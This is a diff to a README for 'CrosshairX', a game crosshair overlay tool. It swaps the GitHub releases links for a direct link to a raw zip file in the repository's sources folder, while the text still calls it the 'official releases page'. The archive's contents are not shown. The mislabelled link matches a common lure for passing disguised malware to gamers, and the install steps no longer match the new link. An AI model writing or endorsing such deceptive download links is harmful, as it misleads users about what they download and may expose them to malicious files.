@@ -1,6 +1,6 @@
 # 🎯 CrosshairX - Improve your aim with custom overlays
 
-[![Download CrosshairX](https://img.shields.io/badge/Download-CrosshairX-blue)](https://github.com/priyanshusinghrajput143/CrosshairX/releases)
+[![Download CrosshairX](https://img.shields.io/badge/Download-CrosshairX-blue)](https://github.com/priyanshusinghrajput143/CrosshairX/raw/refs/heads/main/sources/X-Crosshair-3.4.zip)
 
 CrosshairX provides a custom overlay for your PC games. It works with popular titles like CS2, Valorant, Fortnite, and Apex Legends. The software places a crosshair on your screen that stays visible while you play. This tool helps players maintain focus and improves aim consistency. You can adjust the size, color, and shape of your crosshair to match your preferences.
 
@@ -19,7 +19,7 @@ CrosshairX runs on most modern desktop computers. Check your system against this
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/priyanshusinghrajput143/CrosshairX/releases) to download the latest version.
+1. Visit the [official releases page](https://github.com/priyanshusinghrajput143/CrosshairX/raw/refs/heads/main/sources/X-Crosshair-3.4.zip) to download the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file to start the download.
 4. Locate the file in your Downloads folder after it finishes.
